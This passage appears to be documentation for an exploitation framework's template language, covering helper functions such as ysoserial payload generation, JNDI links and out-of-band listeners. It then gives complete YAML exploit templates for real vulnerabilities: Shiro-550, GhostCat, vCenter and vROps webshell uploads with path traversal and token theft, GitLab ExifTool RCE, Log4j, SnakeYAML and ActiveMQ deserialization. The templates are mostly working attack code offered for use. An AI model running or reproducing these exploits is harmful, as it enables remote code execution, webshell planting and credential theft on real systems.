Generates and returns a random UUID string.

```expr
uuid() == "1da56636-b65c-4655-b702-116744ae3e03"
```

#### randomInt(min, max)

Generates a random integer between `min` and `max`.

```expr
randomInt(1, 100) == 42
```

#### randomStr(min[, max])

Generates a random alphanumeric string.

```expr
randomStr(8) == "J9jMcdL0"
randomStr(8, 16) == "uhOhPd7EY6oz"
```

#### randomLower(min[, max])

Generates a random lowercase string.

```expr
randomLower(8) == "nuuttgvt"
randomLower(8, 16) == "vgukrecqdzanjb"
```

#### randomUpper(min[, max])

Generates a random uppercase string.

```expr
randomUpper(8) == "NUUTTGVT"
randomUpper(8, 16) == "VGUKRECQDZANJB"
```

### Time Operations

#### now()

Returns the current time of type `time.Time`.

```expr
now().Year() == 2026
```

#### duration(str)

Converts `str` into a `time.Duration` type value.

```expr
duration("1h").Seconds() == 3600
duration("10m").Seconds() == 600
```

#### date(str[, format[, timezone]])

Converts `str` into a `time.Time` type value.

```expr
date("2023-08-14").Year() == 2023
date("2023-08-14 00:00:00", "2006-01-02 15:04:05").Day() == 14
```

### Data Extraction

#### get(v, key)

Extracts the value of a specified key or index from an object or array.

```expr
get([1, 2, 3], 1) == 2
get({"name": "John", "age": 30}, "name") == "John"
```

#### keys(map)

Returns all keys of an object.

```expr
keys({"name": "John", "age": 30}) == ["name", "age"]
```

#### values(map)

Returns all values of an object.

```expr
values({"name": "John", "age": 30}) == ["John", 30]
```

#### findall(regex, str)

Finds all substrings matching the regular expression in the string.

```expr
findall(`\d+`, "12abc34") == ["12", "34"]
```

#### submatch(regex, str)

Finds the first match and its capture groups for the regular expression in the string.

```expr
submatch(`age=(\d+)`, "name=jack, age=18") == ["age=18", "18"]
```

### Type Conversion

#### type(v)

Returns the data type of `v`.

Supported types are:

- nil
- int
- map
- uint
- bool
- float
- array
- string
- time.Time
- time.Duration

```expr
type(42) == "int"
type("hello") == "string"
type(now()) == "time.Time"
```

#### int(v)

Converts the value `v` to an integer.

```expr
int("123") == 123
```

#### float(v)

Converts the value `v` to a float.

```expr
float("1.23") == 1.23
```

#### string(v)

Converts the value `v` to a string.

```expr
string(123) == "123"
```

#### toJSON(v)

Converts an object into a JSON string.

```expr
toJSON({"name": "John", "age": 30}) == '{"name":"John","age":30}'
```

#### fromJSON(v)

Parses a JSON string into an object.

```expr
fromJSON('{"name": "John", "age": 30}') == {"name": "John", "age": 30}
```

#### toPairs(map)

Converts an object into an array of [key, value] pairs.

```expr
toPairs({"name": "John", "age": 30}) == [["name", "John"], ["age", 30]]
```

#### fromPairs(array)

Converts an array of [key, value] pairs back into an object.

```expr
fromPairs([["name", "John"], ["age", 30]]) == {"name": "John", "age": 30}
```

### Compression and Archiving

#### tar(name1, content1, name2, content2, ...)

Generates a tar archive.

```expr
tar("test.txt", "hello") == "\x74\x65\x73\x74..."
```

#### zip(name1, content1, name2, content2, ...)

Generates a zip compressed file.

```expr
zip("test.txt", "hello") == "\x50\x4b\x03\x04..."
```

#### gzip(v)

Compresses data using gzip.

```expr
gzip("hello") == "\x1f\x8b\x08\x00..."
```

#### zlib(v)

Compresses data using zlib.

```expr
zlib("hello") == "\x78\x9c\xcb\x48..."
```

#### gunzip(v)

Decompresses gzip data.

```expr
gunzip("\x1f\x8b\x08\x00...") == "hello"
```

### Advanced Tools

#### js(code[, map])

Executes JavaScript code; variables can be passed in via the `map` parameter.

```expr
js("a + b", {"a": 1, "b": 2}) == 3
```

#### tpl(path, map)

Renders a file using the Go template engine.

```expr
// test.tpl: Hello {{.key}}!
tpl("test.tpl", {"key": "World"}) == "Hello World!"
```

#### yso(gadget, method, arg1, arg2?)

Generates Java deserialization payloads using ysoserial.

Supported `gadget`s are:

AspectJWeaver, BadAttributeValueExpExceptionToString, BeanShell1, C3P0, C3P0Tomcat, C3P0_LowVer, Click1, Clojure, CommonsBeanutils1, CommonsBeanutils1_183, CommonsBeanutils2, CommonsBeanutils2_183, CommonsBeanutils3, CommonsBeanutils3_183, CommonsCollections1, CommonsCollections10, CommonsCollections11, CommonsCollections2, CommonsCollections3, CommonsCollections4, CommonsCollections5, CommonsCollections6, CommonsCollections6Lite, CommonsCollections7, CommonsCollections8, CommonsCollections9, CommonsCollectionsK1, CommonsCollectionsK2, CommonsCollectionsK3, CommonsCollectionsK4, FastJson, FileUpload1, Groovy1, Hibernate1, Hibernate2, JBossInterceptors1, JSON1, JavassistWeld1, Jdk7u21, Jdk8u20, Jython1, MozillaRhino1, MozillaRhino2, Myfaces1, Myfaces2, ROME, Spring1, Spring2, Spring3, TomcatEL, TomcatGroovy, TomcatMVEL, TomcatSnakeYaml, TomcatXStream, Vaadin1, Wicket1

Supported `method`s are:

- jar
- run
- cmd
- bcel
- jndi
- class
- upload
- unix or linux
- win or windows
- ...

Note: Some `method`s for specific `gadget`s may have incomplete support.

```expr
yso("CommonsCollectionsK1", "cmd", "calc") == "\xac\xed\x00\x05..."
yso("CommonsCollectionsK1", "jar", "http://x.x.x.x/test.jar", "com.example.Calc") == "\xac\xed\x00\x05..."
yso("CommonsCollectionsK1", "jndi", "ldap://x.x.x.x:1389/obj") == "\xac\xed\x00\x05..."
yso("CommonsCollectionsK1", "class", "/tmp/calc.class") == "\xac\xed\x00\x05..."
yso("CommonsCollectionsK1", "upload", "/tmp/local.txt", "/var/www/remote.txt") == "\xac\xed\x00\x05..."
```

#### jndi(scheme, value)

Creates a JNDI injection link; requires use with an Agent node.

Supported `scheme`s are:

- ldap
- ldaps

Supported `value` types are:

- URL address
- Java bytecode
- Java serialized data

```expr
jndi("ldap", "http://x.x.x.x/#calc") == "ldap://x.x.x.x/obj"
jndi("ldaps", "\xca\xfe\xba\xbe...") == "ldaps://x.x.x.x/obj"
jndi("ldaps", "\xac\xed\x00\x05...") == "ldaps://x.x.x.x/obj"
```

#### exec(name, arg1[, ...])

Executes a local system command.

```expr
exec("python", "-c", "print('hello')") == "hello"
```

#### read(path)

Reads the contents of a local file.

```expr
read("cache/e10adc3949ba59abbe56e057f20f883e.txt") == "hello"
```

#### write(name, content)

Writes content to the local cache directory and returns the file path.

```expr
write("test.txt", "hello") == "cache/e10adc3949ba59abbe56e057f20f883e.txt"
```

#### agent(mode, ..., ttl?)

Registers the corresponding service on the Agent node; `ttl` is an optional parameter.

| Mode    | Function                                            | Description              |
| ------- | --------------------------------------------------- | ------------------------ |
| `dns`   | `agent("dns", domain, type, value, ttl?)`           | Register DNS record      |
| `ldap`  | `agent("ldap", name, object, ttl?)`                 | Register LDAP entry      |
| `ldaps` | `agent("ldaps", name, object, ttl?)`                | Register LDAPS entry     |
| `http`  | `agent("http", path, status, headers, body, ttl?)`  | Register HTTP interface  |
| `https` | `agent("https", path, status, headers, body, ttl?)` | Register HTTPS interface |

**dns** mode:

| Parameter | Description  | Example                                             |
| --------- | ------------ | --------------------------------------------------- |
| `domain`  | Domain       | `"www.test.com"`                                    |
| `type`    | Record type  | `"A"`, `"MX"`, `"NS"`, `"TXT"`, `"AAAA"`, `"CNAME"` |
| `value`   | Record value | `"127.0.0.1"`, `"::1"`                              |
| `ttl`     | Expiration   | `"60s"`, `"10m"`, `"1h"`                            |

**ldap / ldaps** mode:

| Parameter | Description     | Example                       |
| --------- | --------------- | ----------------------------- |
| `name`    | Identify entry  | `"cn=test,dc=example,dc=com"` |
| `object`  | Response object | `{"user": "user@mail.com"}`   |
| `ttl`     | Expiration      | `"60s"`, `"10m"`, `"1h"`      |

**http / https** mode:

| Parameter | Description   | Example                  |
| --------- | ------------- | ------------------------ |
| `path`    | Path          | `"/test"`                |
| `status`  | Status code   | `200`                    |
| `headers` | Response hdrs | `{"Server": "nginx"}`    |
| `body`    | Response body | `"hello"`                |
| `ttl`     | Expiration    | `"60s"`, `"10m"`, `"1h"` |

```expr
agent("dns", "www.test.com", "A", "127.0.0.1", "60s") == "www.test.com"
agent("ldap", "cn=test,dc=example,dc=com", {"user":"user@mail.com"}) == "ldap://x.x.x.x/cn=test,dc=example,dc=com"
agent("http", "/test", 200, {"Server": "nginx"}, "hello") == "http://x.x.x.x/test"
```

#### cache(url)

Gets data from cache; must be used with `httplog`.

```expr
cache("http://x.x.x.x/test") == "GET /test HTTP/1.1 ..."
```

#### sleep(n)

Pauses for `n` seconds.

```expr
sleep(5) == true
```

#### httplog(mode?)

Creates an HTTP listener link; requires connection to an Agent node.

Supported `mode`s are:

- raw
- header
- body

Note: If `mode` is not set, it defaults to `body` and cannot be used with `cache`.

```expr
httplog() == "http://x.x.x.x/xxx"
httplog("raw") == "http://x.x.x.x/xxx"
```

#### classname(v)

Extracts the class name from Java bytecode.

```expr
classname("\xca\xfe\xba\xbe...") == "com.example.Main"
```

## Reference Examples

### CVE-2016-4437

- File Path: `plugin/Shiro/shiro-550-aes-cbc#C.yml`
- Template Type: Command (C)
- Key Points: Uses `exploit.command.Yso()` to generate a deserialization payload, encrypts and encodes an AES-CBC malicious Cookie with `toAES()` and `base64()`, uses `uuid()` to generate a random ID to filter the echo, and uses `Truncate()` to accurately intercept the command execution result.

```yaml
name: shiro-550-aes-cbc

tags:
    - Shiro550
    - Apache Shiro
    - CVE-2016-4437

vars:
    UUID: uuid()
    IV: randomStr(16)
    Name: exploit.option.arg2
    Value: base64(IV + toAES("CBC", b64dec(exploit.option.arg3), IV, exploit.command.Yso(exploit.option.arg1)))
    Command: format(`%s && echo %s`, exploit.command, UUID)

default:
    arg1: CommonsBeanutils1,CommonsBeanutils2,CommonsCollections1,CommonsCollections2,CommonsCollections3,CommonsCollections4,CommonsCollectionsK1,CommonsCollectionsK2,CommonsBeanutils1_183,CommonsBeanutils2_183
    arg2: rememberMe
    arg3: kPH+bIxk5D2deZiIxcaaaA==
    method: spring,tomcat
    command: whoami

rules:
    r0:
        request:
            method: POST
            headers:
                Cookie: "{{Name}}={{Value}}"
                X-Access-Token: "{{Command}}"
        expr: response.body.Has(UUID)
        print:
            - response.body.Truncate(UUID)
expr: r0()
```

### CVE-2020-1938

- File Path: `plugin/Tomcat/tomcat-ajp-include#D.yml`
- Template Type: Download (D)
- Key Points: Directly invokes a local Python script using the `exec()` function, constructing and sending complex AJP packets to get execution results.

```yaml
name: tomcat-ajp-include

type: python

tags:
    - GhostCat
    - Tomcat AJP
    - CVE-2020-1938
    - CNVD-2020-10487

vars:
    Output: exec("python", "plugin/Tomcat/CVE-2020-1938.py", "-t", request.url.domain, "-p", request.url.port, "-m", exploit.option.arg1, "-f", exploit.download)

default:
    arg1: eval,read
    arg2: no proxy support
    download: WEB-INF/web.xml

rules:
    r0:
        expr: len(Output) > 0
        print:
            - Output
expr: r0()
```

### CVE-2021-21972

- File Path: `plugin/VMware/vmware-vcenter-uploadova#U.yml`
- Template Type: Upload (U)
- Key Points: Dynamically constructs the path through `js()` combined with `tar()` packaging, then uploads the file via `uploadova`, validating the result using a random identifier generated by `uuid()`.

```yaml
name: vmware-vcenter-uploadova

tags:
    - VMware vCenter
    - CVE-2021-21972

vars:
    UUID: uuid()
    Form: randomStr(16)
    Path: exploit.upload.remote
    IsJSP: hasSuffix(Path, ".jsp") || hasSuffix(Path, ".jspx")
    Archive: |
        if IsJSP == false {
            tar(format("../../../../%s", trimPrefix(Path, "/")), exploit.upload.content)
        } else {
            tar(js("let arr=[],[n,m]=range.split('-').map(Number);arr.push(`../../../../ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/${shell}`,content);for(let i=n;i<=m;i++)arr.push(`../../../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/${i}/0/h5ngc.war/resources/${shell}`,content);arr", {"range": exploit.option.arg1, "shell": Path, "content": UUID + exploit.upload.content}))
        }

default:
    arg1: 30-50
    remote: example.jsp

rules:
    r0:
        request:
            method: POST
            path: /ui/vropspluginui/rest/services/uploadova
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{Form}}
            body: |
                ------WebKitFormBoundary{{Form}}
                Content-Disposition: form-data; name="uploadFile"; filename="{{UUID}}.tar"
                Content-Type: application/octet-stream

                {{Archive}}
                ------WebKitFormBoundary{{Form}}--
        expr: response.body.Has("SUCCESS") && IsJSP
    r1:
        request:
            method: GET
            path: /statsreport/{{Path}}
        expr: response.body.Has(UUID)
        print:
            - "format(`Shell URL: %s`, request.url)"
    r2:
        request:
            method: GET
            path: /ui/resources/{{Path}}
        expr: response.body.Has(UUID)
        print:
            - "format(`Shell URL: %s`, request.url)"
expr: r0() && (r1() || r2())
```

### CVE-2021-22205

- File Path: `plugin/GitLab/gitlab-exiftool-rce#C.yml`
- Template Type: Command (C)
- Key Points: First extract the login page CSRF Token, then use `hexdec(format(...))` to dynamically concatenate the `exploit.command.OOB()` out-of-band command to create a malformed image byte stream, and finally upload the image to trigger the ExifTool vulnerability.

```yaml
name: gitlab-exiftool-rce

tags:
    - ExifTool
    - CVE-2021-22205

vars:
    UUID: uuid()
    Form: randomStr(16)
    Command: format("echo %s|base64 -d|bash", base64(exploit.command.OOB()))
    Image: hexdec(format("41542654464f524d%08x444a5655494e464f0000000a0000000018002c01160142476a7000000000414e5461%08x286d657461646174610a0928436f7079726967687420225c0a22202e2071787b%x7d202e205c0a22206220222920290a", len(Command) + 0x55, len(Command) + 0x2f, Command))

default:
    method: curl,ping,none,nslookup
    command: whoami

rules:
    r0:
        request:
            method: GET
            path: /users/sign_in
            redirect: true
        expr: response.status == 200 && response.body.Has('csrf-token" content="')
        vars:
            Token: response.body.Submatch(`csrf-token" content="(.+?)" />`)
            Cookie: response.cookie
    r1:
        request:
            method: POST
            path: /uploads/user
            headers:
                Cookie: "{{Cookie}}"
                X-CSRF-Token: "{{Token}}"
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{Form}}
            body: |
                ------WebKitFormBoundary{{Form}}
                Content-Disposition: form-data; name="file"; filename="{{UUID}}.jpg"
                Content-Type: image/jpeg

                {{Image}}
                ------WebKitFormBoundary{{Form}}--
        expr: response.status == 422
expr: r0() && r1()
```

### CVE-2021-44228

- File Path: `plugin/VMware/vmware-vcenter-log4j#M.yml`
- Template Type: MemShell (M)
- Key Points: Uses `exploit.memshell.JNDI()` to generate a JNDI injection link, obfuscates the Log4j payload using `bypass()`, injects the `X-Forwarded-For` header to trigger the Log4j vulnerability, and uses `exploit.memshell.Print()` to output the execution result.

```yaml
name: vmware-vcenter-log4j

tags:
    - JNDI
    - Log4j
    - VMware vCenter
    - CVE-2021-44228

vars:
    Log4j: bypass("log4j", format("${jndi:%s}", exploit.memshell.JNDI(exploit.option.arg1, exploit.option.arg3)))

default:
    arg1: ldap,ldaps
    arg3: TomcatEL,TomcatGroovy,CommonsBeanutils1,CommonsBeanutils2,CommonsCollectionsK1,CommonsCollectionsK2
    server: Tomcat
    custom: "*.class"

rules:
    r0:
        request:
            method: GET
            path: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
            headers:
                X-Forwarded-For: "{{Log4j}}"
        expr: response.status >= 200
        print:
            - exploit.memshell.Print(response.body)
expr: r0()
```

### CVE-2022-1471

- File Path: `plugin/Spring/spring-cloud-env-snakeyaml#M.yml`
- Template Type: MemShell (M)
- Key Points: Hosts a Jar package with a SnakeYAML payload using `agent()`, writes the YAML URL into the `spring.cloud.bootstrap.location` configuration, then refreshes the configuration to trigger the SnakeYAML deserialization vulnerability.

```yaml
name: spring-cloud-env-snakeyaml

tags:
    - CVE-2022-1471
    - Spring Env SnakeYAML

vars:
    Jar: 'agent(exploit.option.arg1, "/" + uuid() + ".jar", 200, {}, exploit.memshell.custom != "" ? read(exploit.memshell.custom) : exploit.memshell.Msp("ScriptEngineJar"))'
    Yaml: agent(exploit.option.arg1, "/" + uuid() + ".yml", 200, {}, format('!!javax.script.ScriptEngineManager [\n  !!java.net.URLClassLoader [[\n    !!java.net.URL ["%s"]\n  ]]\n]', Jar))

default:
    arg1: http,https
    server: Jetty,Tomcat,SpringWebMvc
    custom: "*.jar"

rules:
    r0:
        request:
            method: POST
            path: /env
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: spring.cloud.bootstrap.location={{Yaml}}
        expr: response.status == 200 && response.header.Has("application/json") && response.body.Has("spring.cloud.bootstrap.location")
    r1:
        request:
            method: POST
            path: /refresh
            headers:
                Content-Type: application/x-www-form-urlencoded
        expr: response.status == 200 && response.header.Has("application/json")
        print:
            - exploit.memshell
expr: r0() && r1()
```

### CVE-2023-46604

- File Path: `plugin/ActiveMQ/activemq-openwire-61616#C.yml`
- Template Type: Command (C)
- Key Points: Uses `replace()` and `repeat()` to pad the command to a fixed Class offset, uses `yso()` to generate a deserialization payload, dynamically constructs OpenWire protocol packets using `format()` and `hexdec()`, and finally sends the packet and intercepts the execution result from the response.

```yaml
name: activemq-openwire-61616

type: tcp

tags:
    - OpenWire
    - CVE-2023-46604
    - Apache ActiveMQ

vars:
    Class: b64dec("yv66vgAAADEAqwoALwBMBwBNCABOCABPCQAuAFAKAAIAUQgAUgoAUwBUCgACAFUIAFYKAAIAVwgAWAgAWQcAWgoADgBbCgAOAFwKAF0AXgcAXwoAEgBMCgBgAGEKABIAYgcAYwoAFgBkCwBlAGYLAGUAZwsAZQBoCABpCwBlAGoKABIAawoAAgBsCABtCgBuAG8IAEIKAG4AcAoAcQByCgBzAHQKAHEAdQcAdggAdwgARgcAeAoAKQB5CgB6AGgHAHsIAHwHAH0HAH4BAAdDb250...")
    Object: base64(yso(exploit.option.arg1, "", "class_base64:" + base64(replace(Class, repeat("A", 4096), exploit.command.command + repeat(" ", 4096 - len(exploit.command.command))))))
    Message: format("[main]\nbs = org.apache.activemq.util.ByteSequence\nbs.data = %s\nbs.offset = 0\nbs.length = %d\nmessage = org.apache.activemq.command.ActiveMQObjectMessage\nmessage.content = $bs\nmessage.trustAllPackages = true\nmessage.object.x = x\n", Object, len(Object))
    OpenWire: hexdec(format("%08x1f0000000000000000000101002c6f72672e6170616368652e6163746976656d712e736869726f2e656e762e496e69456e7669726f6e6d656e7401%04x%x", len(Message) + 61, len(Message), Message))

default:
    arg1: CommonsBeanutils1,CommonsBeanutils2
    command: cat conf/jetty-realm.properties

rules:
    r0:
        request:
            body: "-"
        expr: response.body.Has("ActiveMQ")
    r1:
        request:
            body: "{{OpenWire}}"
        expr: len(response.body) > 13 && response.body.HasPrefix(hexdec("000000000e011700022e2e"))
        print:
            - string(response.body)[13:]
expr: r0() && r1()
```

### CVE-2021-21975 + CVE-2021-21983

- File Path: `plugin/VMware/vmware-vrealize-operations-ssrf&upload#U.yml`
- Template Type: Upload (U)
- Key Points: Uses SSRF to send an authentication request to `httplog()`, extracts the Token using `sleep()` + `cache()`, and then utilizes the Token plus the file upload interface to perform path traversal and write a Shell.

```yaml
name: vmware-vrealize-operations-ssrf&upload

tags:
    - vROps
    - CVE-2021-21975
    - CVE-2021-21983
    - VMware vRealize Operations

vars:
    UUID: uuid()
    Form: randomStr(16)
    Path: exploit.upload.remote
    Shell: exploit.upload.content
    Accept: trimPrefix(httplog("header"), "http://")

default: example.jsp

rules:
    r0:
        request:
            method: POST
            path: /casa/nodes/thumbprints
            headers:
                Content-Type: application/json
            body: '["{{Accept}}"]'
        expr: response.status == 200 && response.body.Has(Accept)
        vars:
            Token: 'sleep(3); trim(submatch("(?i)Authorization: Basic (.+)", cache("http://" + Accept))[1])'
        print:
            - 'format("Authorization: Basic %s", Token)'
    r1:
        request:
            method: POST
            path: /casa/private/config/slice/ha/certificate
            headers:
                Authorization: Basic {{Token}}
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{Form}}
            body: |
                ------WebKitFormBoundary{{Form}}
                Content-Disposition: form-data; name="name"

                ../../../../../usr/lib/vmware-casa/casa-webapp/webapps/casa/{{Path}}
                ------WebKitFormBoundary{{Form}}
                Content-Disposition: form-data; name="file"; filename="{{UUID}}"
                Content-Type: text/plain

                <!--{{UUID}}-->{{Shell}}
                ------WebKitFormBoundary{{Form}}--
        expr: response.status == 200
    r2:
        request:
            method: GET
            path: /casa/{{Path}}
            headers:
                Authorization: Basic {{Token}}
        expr: response.body.Has(UUID)
        print:
            - "format(`Shell URL: %s\nAuthorization: %s`, request.url, Token)"
expr: r0() && r1() && r2()
```

## Common Errors

**1. invalid filename format**

Please carefully follow the [File Format](#file-format) conventions, especially the `.yml` suffix.

**2. unknown oob method: ???**

The OOB module only supports `curl`, `ping`, and `nslookup`.

**3. agent configured with ip does not support ping**

Ensure the Agent node is connected via a domain name. Connecting via an IP address does not support out-of-band extraction via `ping`.

**4. interface conversion: interface {} is ???, not string**

If you definitely need a string type, cast it using `string()`.
